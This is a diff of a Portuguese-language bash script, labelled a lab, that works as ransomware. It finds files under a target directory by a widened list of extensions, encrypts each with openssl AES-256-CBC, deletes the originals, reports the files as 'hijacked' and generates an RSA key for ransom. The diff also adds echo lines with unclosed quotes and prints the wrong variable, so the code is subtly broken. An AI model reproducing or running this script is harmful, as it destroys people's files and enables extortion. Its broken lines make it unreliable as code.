@@ -5,9 +5,13 @@
 # Data: 29/09/2023		#
 #################################
 
+echo "----------------------------------------------"
+echo "Iniciando script...
+echo "----------------------------------------------"
+
 # local e extenções de arquivos que serão atacadas neste lab:
 volume_alvo=/dados
-arquivos=$(find $volume_alvo -print | egrep ".txt|.sql|.xls|.doc|.pdf|.py|.zip|.exe")
+arquivos=$(find $volume_alvo -print | egrep ".txt|.sql|.pdf|.py|.zip|.exe|.ppt|.pptx|.ots|.odt|.png|.jpg|.doc|.docx|.xls|.xlsx|.rar")
 
 #arquivos=$(ls *.txt *.tar *.gzip *.doc *.docx *.xls *.xlsx *.ppt *.pptx *.sql 2>/dev/null)
 
@@ -17,14 +21,19 @@ chave=$(/usr/bin/dbus-uuidgen)
 echo $chave > chave.key
 
 # vamos ler todos os arquivos da pasta desejada, exceto arquivos que vou precisar depois:
+i=0
 for file in $arquivos
 do
 	# agora vamos encriptar tudo usando a chave desejado
 	openssl enc -in $file -out $file".cry" -aes-256-cbc -pbkdf2 -k chave.key 
 	echo "[+] $file"
 	rm $file
-
+ 	((i=i+1))
 done
+
+echo "----------------------------------------------"
+echo "$1 arquivos sequestrados com sucesso!
+echo "----------------------------------------------"
 
 # vamos gerar um nova chave para proteger minha chave privada necessária para resgate
 openssl genrsa -out resgate.pem 4096
